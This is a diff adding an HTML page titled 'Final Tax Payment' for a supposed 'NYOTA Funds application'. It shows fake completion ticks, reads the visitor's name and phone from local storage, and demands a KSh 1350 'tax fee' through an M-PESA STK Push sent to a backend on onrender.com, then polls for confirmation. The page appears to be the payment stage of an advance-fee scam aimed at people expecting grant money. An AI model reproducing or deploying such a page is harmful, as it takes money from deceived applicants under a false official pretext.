@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#087f32">
+<title>Final Tax Payment</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Inter",sans-serif;}
+body{
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+padding:10px;
+background:
+radial-gradient(circle at 10% 10%, rgba(34,197,94,.35), transparent 28%),
+radial-gradient(circle at 90% 90%, rgba(59,130,246,.35), transparent 28%),
+linear-gradient(135deg,#064e3b,#1e40af);
+}
+.container{width:100%;max-width:385px;}
+.card{background:#fff;border-radius:22px;overflow:hidden;box-shadow:0 16px 45px rgba(0,0,0,.24);}
+.header{
+background:linear-gradient(135deg,#087f32,#2563EB);
+color:#fff;
+text-align:center;
+padding:18px 16px 36px;
+position:relative;
+}
+.step{
+display:inline-block;
+padding:5px 12px;
+border-radius:999px;
+background:rgba(255,255,255,.15);
+font-size:11px;
+margin-bottom:10px;
+}
+.header h1{font-size:24px;font-weight:800;}
+.header p{font-size:13px;opacity:.92;margin-top:4px;}
+.badge{
+position:absolute;
+left:50%;
+bottom:-21px;
+transform:translateX(-50%);
+width:42px;
+height:42px;
+background:#fff;
+border-radius:14px;
+display:flex;
+justify-content:center;
+align-items:center;
+font-size:20px;
+box-shadow:0 8px 20px rgba(37,99,235,.25);
+}
+.content{padding:30px 16px 16px;}
+.status{
+background:#F0FDF4;
+border:1px solid #BBF7D0;
+border-radius:14px;
+padding:12px;
+margin-bottom:14px;
+}
+.status-row{
+display:flex;
+align-items:center;
+gap:10px;
+font-size:14px;
+font-weight:700;
+color:#166534;
+padding:6px 0;
+}
+.tick{
+width:26px;
+height:26px;
+background:#DCFCE7;
+border-radius:50%;
+display:flex;
+justify-content:center;
+align-items:center;
+font-size:16px;
+}
+.info{
+background:#EFF6FF;
+border:1px solid #BFDBFE;
+border-radius:14px;
+padding:13px;
+font-size:13px;
+line-height:1.5;
+color:#374151;
+margin-bottom:16px;
+}
+.customer{display:flex;flex-direction:column;gap:8px;margin-bottom:16px;}
+.customer-row{
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:11px;
+background:#F8FAFC;
+border:1px solid #E5E7EB;
+border-radius:12px;
+}
+.label{
+display:flex;
+align-items:center;
+gap:9px;
+font-size:13px;
+color:#64748B;
+font-weight:500;
+}
+.icon{
+width:30px;
+height:30px;
+background:#EFF6FF;
+border-radius:10px;
+display:flex;
+justify-content:center;
+align-items:center;
+font-size:15px;
+}
+.value{font-size:13px;font-weight:700;color:#087f32;}
+.amount{
+background:#EFF6FF;
+border-left:5px solid #2563EB;
+border-radius:14px;
+padding:15px;
+text-align:center;
+margin-bottom:16px;
+}
+.amount small{
+display:block;
+font-size:11px;
+color:#64748B;
+margin-bottom:4px;
+}
+.amount strong{
+font-size:26px;
+font-weight:800;
+color:#2563EB;
+}
+button{
+width:100%;
+padding:16px;
+border:none;
+border-radius:16px;
+background:linear-gradient(135deg,#16A34A,#087f32);
+color:#fff;
+font-size:17px;
+font-weight:700;
+cursor:pointer;
+box-shadow:0 12px 28px rgba(22,163,74,.35);
+}
+button:disabled{opacity:.6;cursor:not-allowed;}
+#stkMessage{
+margin-top:12px;
+padding:8px;
+border-radius:8px;
+text-align:center;
+font-size:13px;
+min-height:20px;
+}
+.success{background:#ECFDF5;color:#15803D;}
+.error{background:#FEF2F2;color:#DC2626;}
+.footer{
+display:flex;
+justify-content:space-between;
+flex-wrap:wrap;
+gap:6px;
+margin-top:14px;
+padding-top:12px;
+border-top:1px solid #E5E7EB;
+font-size:10px;
+color:#64748B;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+<div class="card">
+
+<div class="header">
+<div class="step">FINAL PAYMENT STAGE</div>
+<h1>Final Tax Payment</h1>
+<p>Complete your payment via M-PESA STK Push</p>
+<div class="badge">🛡️</div>
+</div>
+
+<div class="content">
+
+<div class="status">
+<div class="status-row"><div class="tick">✓</div><span>Processing Completed</span></div>
+<div class="status-row"><div class="tick">✓</div><span>Delivery Completed</span></div>
+<div class="status-row"><div class="tick">✓</div><span>Commitment Completed</span></div>
+</div>
+
+<div class="info">
+Congratulations! Your application has reached the final tax payment stage. Complete the payment below to finalize your NYOTA Funds application
+</div>
+
+<div class="customer">
+
+<div class="customer-row">
+<div class="label"><div class="icon">👤</div>Applicant</div>
+<div class="value" id="fullName">Loading...</div>
+</div>
+
+<div class="customer-row">
+<div class="label"><div class="icon">📱</div>Phone</div>
+<div class="value" id="phone">Loading...</div>
+</div>
+
+</div>
+
+<div class="amount">
+<small>Final Tax Fee</small>
+<strong>KSh 1350</strong>
+</div>
+
+<button id="payBtn">Pay KSh 1350 →</button>
+
+<div id="stkMessage"></div>
+
+<div class="footer">
+<span>🔒 SSL Secure</span>
+<span>M-PESA STK Push</span>
+<span>Protected</span>
+</div>
+
+</div>
+</div>
+</div>
+
+<script>
+"use strict";
+
+const BACKEND_URL = "https://nyota-funds-26-27.onrender.com";
+const PAYMENT_AMOUNT=1350;
+
+document.getElementById("fullName").textContent=
+localStorage.getItem("fullName")||
+localStorage.getItem("fullname")||
+"Applicant";
+
+document.getElementById("phone").textContent=
+localStorage.getItem("phoneNumber")||
+localStorage.getItem("phone")||
+"Not available";
+
+const payBtn=document.getElementById("payBtn");
+const message=document.getElementById("stkMessage");
+
+function setMessage(text,type=""){
+message.textContent=text;
+message.className=type;
+}
+
+function setButton(disabled,text){
+payBtn.disabled=disabled;
+payBtn.textContent=text;
+}
+
+async function readJson(response){
+const txt=await response.text();
+return txt?JSON.parse(txt):{};
+}
+
+async function payNow(){
+
+const phone=
+localStorage.getItem("phoneNumber")||
+localStorage.getItem("phone");
+
+if(!phone){
+setMessage("Phone number not found.","error");
+return;
+}
+
+setButton(true,"Sending STK Push...");
+setMessage("Sending payment request...");
+
+try{
+
+const response=await fetch(`${BACKEND_URL}/stk-push`,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+phone,
+amount:PAYMENT_AMOUNT
+})
+});
+
+const data=await readJson(response);
+
+if(!response.ok||data.success===false){
+throw new Error(data.message||"Payment request failed.");
+}
+
+const transactionId=
+data.transactionId||
+data.checkout_request_id||
+data.data?.transactionId||
+data.data?.checkout_request_id;
+
+if(!transactionId){
+throw new Error("Transaction reference missing.");
+}
+
+setButton(true,"Waiting for payment...");
+setMessage("STK Push sent. Enter your M-PESA PIN.");
+
+await checkPayment(transactionId);
+
+}catch(error){
+
+setMessage(error.message,"error");
+setButton(false,"Pay KSh 1,350 →");
+
+}
+
+}
+
+async function checkPayment(transactionId){
+
+const start=Date.now();
+
+while(Date.now()-start<120000){
+
+try{
+
+const response=await fetch(`${BACKEND_URL}/payment-status`,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({transactionId})
+});
+
+const result=await readJson(response);
+
+const payment=result.data||result;
+const status=String(payment.status||"").toUpperCase();
+
+if(["SUCCESS","COMPLETED","CONFIRMED"].includes(status)){
+
+setMessage("Payment confirmed. Redirecting...","success");
+setButton(true,"Payment Confirmed");
+
+setTimeout(()=>{
+window.location.href="final.html";
+},1000);
+
+return;
+}
+
+if(["FAILED","CANCELLED","EXPIRED"].includes(status)){
+throw new Error("Payment "+status.toLowerCase()+".");
+}
+
+}catch(error){
+
+if(/failed|cancelled|expired/i.test(error.message)){
+setMessage(error.message,"error");
+setButton(false,"Pay KSh 1,350 →");
+return;
+}
+
+}
+
+await new Promise(resolve=>setTimeout(resolve,3000));
+
+}
+
+setMessage("Payment confirmation timed out.","error");
+setButton(false,"Pay KSh 1,350 →");
+
+}
+
+payBtn.addEventListener("click",payNow);
+</script>
+
+</body>
+</html>
